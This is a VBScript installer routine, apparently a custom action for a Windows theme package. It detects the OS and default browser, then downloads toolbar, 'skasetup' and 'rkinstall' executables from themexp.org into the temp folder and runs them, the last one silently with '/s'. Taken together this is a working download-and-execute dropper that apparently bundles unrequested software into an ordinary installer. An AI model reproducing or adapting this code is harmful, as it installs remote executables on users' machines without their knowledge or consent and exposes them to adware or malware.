Function Toolbar()

Set WSHShell = CreateObject("WScript.Shell")
Dim browser, OS, vartoolbarexe
vartoolbarexe = Session.Property("TOOLBAREXE")

strComputer = "."
 Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")        

Set colOperatingSystems = objWMIService.ExecQuery _
        ("Select * from Win32_OperatingSystem")

 For Each objOperatingSystem in colOperatingSystems
              
 OS = objOperatingSystem.Caption & " " & _
                    objOperatingSystem.Version
 Next

Set RegularExpressionObject = New RegExp

With RegularExpressionObject
.Pattern = "vista"
.IgnoreCase = True
.Global = True
End With

expressionmatch = RegularExpressionObject.Test(OS)

If expressionmatch Then

on Error Resume Next
strValueName = ("HKCU\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice\Progid")
browser = Wshshell.RegRead(strValueName)
Else

browser = Wshshell.RegRead("HKCR\http\shell\open\command\")

End If

set shell = CreateObject("WScript.Shell")
tempdir = shell.ExpandEnvironmentStrings("%temp%")

Set RegularExpressionObject = New RegExp

With RegularExpressionObject
.Pattern = "firefox"
.IgnoreCase = True
.Global = True
End With

expressionmatch = RegularExpressionObject.Test(browser)

If expressionmatch Then

    strFileURL = "http://www.themexp.org/toolbar/Theme_XP.xpi"
    strHDLocation = tempdir & "\Theme_XP.xpi"
    filetype = "xpi"

Else
    
    strFileURL = "http://www.themexp.org/toolbar/Theme_XP.exe"
    strHDLocation = tempdir & "\Theme_XP.exe"
    filetype = "exe"

End If

Set RegularExpressionObject = nothing

' Fetch the file
    Set objXMLHTTP = CreateObject("Microsoft.XmlHttp")
 
    objXMLHTTP.open "GET", strFileURL, false
    objXMLHTTP.send()
 
    If objXMLHTTP.Status = 200 Then
      Set objADOStream = CreateObject("ADODB.Stream")
      objADOStream.Open
      objADOStream.Type = 1 'adTypeBinary
 
      objADOStream.Write objXMLHTTP.ResponseBody
      objADOStream.Position = 0    'Set the stream position to the start
 
      Set objFSO = Createobject("Scripting.FileSystemObject")
        If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
      Set objFSO = Nothing
 
      objADOStream.SaveToFile strHDLocation
      objADOStream.Close
      Set objADOStream = Nothing
    End If
 
    Set objXMLHTTP = Nothing

    If filetype = "xpi" Then
    
      programsdir = shell.ExpandEnvironmentStrings("%programfiles%")

      wshshell.run "firefox.exe " & Chr(34) & tempdir & "\Theme_XP.xpi" & Chr(34)

    ElseIf filetype = "exe" Then
    
      wshshell.run tempdir & "\Theme_XP.exe " & vartoolbarexe
     
   End If

End Function

Function SeekApp()

Set WSHShell = CreateObject("WScript.Shell")
set shell = CreateObject("WScript.Shell")

tempdir = shell.ExpandEnvironmentStrings("%temp%")

strFileURL = "http://www.themexp.org/toolbar/skasetup-132-SkapWD2.exe"
strHDLocation = tempdir & "\skasetup-132-SkapWD2.exe"

' Fetch the file
    Set objXMLHTTP = CreateObject("Microsoft.XmlHttp")
 
    objXMLHTTP.open "GET", strFileURL, false
    objXMLHTTP.send()
 
    If objXMLHTTP.Status = 200 Then
      Set objADOStream = CreateObject("ADODB.Stream")
      objADOStream.Open
      objADOStream.Type = 1 'adTypeBinary
 
      objADOStream.Write objXMLHTTP.ResponseBody
      objADOStream.Position = 0    'Set the stream position to the start
 
      Set objFSO = Createobject("Scripting.FileSystemObject")
        If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
      Set objFSO = Nothing
 
      objADOStream.SaveToFile strHDLocation
      objADOStream.Close
      Set objADOStream = Nothing
    End If
 
    Set objXMLHTTP = Nothing

    wshshell.run tempdir & "\skasetup-132-SkapWD2.exe"

End Function

Function RK()

Set WSHShell = CreateObject("WScript.Shell")
set shell = CreateObject("WScript.Shell")

tempdir = shell.ExpandEnvironmentStrings("%temp%")

strFileURL = "http://www.themexp.org/toolbar/rkinstall.exe"
strHDLocation = tempdir & "\rkinstall.exe"

' Fetch the file
    Set objXMLHTTP = CreateObject("Microsoft.XmlHttp")
 
    objXMLHTTP.open "GET", strFileURL, false
    objXMLHTTP.send()
 
    If objXMLHTTP.Status = 200 Then
      Set objADOStream = CreateObject("ADODB.Stream")
      objADOStream.Open
      objADOStream.Type = 1 'adTypeBinary
 
      objADOStream.Write objXMLHTTP.ResponseBody
      objADOStream.Position = 0    'Set the stream position to the start
 
      Set objFSO = Createobject("Scripting.FileSystemObject")
        If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
      Set objFSO = Nothing
 
      objADOStream.SaveToFile strHDLocation
      objADOStream.Close
      Set objADOStream = Nothing
    End If
 
    Set objXMLHTTP = Nothing

    wshshell.run tempdir & "\rkinstall.exe -c:314 /s"

End Function